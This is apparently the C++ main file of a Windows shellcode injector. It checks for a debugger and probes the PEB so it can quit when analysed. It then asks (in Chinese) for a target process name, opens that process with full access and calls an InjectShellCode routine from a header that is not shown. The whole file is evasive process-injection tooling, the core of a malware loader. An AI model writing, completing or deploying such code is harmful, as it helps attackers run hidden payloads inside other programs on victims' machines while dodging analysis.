#include <windows.h>
#include <iostream>
#include <excpt.h>
#include <iomanip>
#include <tlhelp32.h>
#include <string>
#include "InjectShellcode.h"
#include "IsDebugging.h"

bool StealthGetPeb(){
    void* pPeb = nullptr;
    __try {
        pPeb = (void*)__readgsqword(0x60);
    }
    __except (EXCEPTION_EXECUTE_HANDLER){
        return false;
    }
    if (pPeb == nullptr) { return false; }
    return true;
}
DWORD GetPidByName(const std::string& ProcName){
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE){ return 0; }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if(Process32First(hSnap, &pe)){
        do{
            if (ProcName == pe.szExeFile){
                return pe.th32ProcessID;
            }
        }while(Process32Next(hSnap, &pe));
    }
    return 0;
}
int main(){
    bool IsDebugging = IsDebuggingEx();
    if(IsDebugging){ return 0; }
    bool GetPeb = StealthGetPeb();
    if(!GetPeb){ return 0; }

    std::string ProcessName;
    std::cout << "[*] 请输入目标进程名：";
    getline(std::cin, ProcessName);
    DWORD ProcessPid = GetPidByName(ProcessName);
    if(ProcessPid == 0){ return 0; }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessPid);
    InjectShellCode(hProcess);
}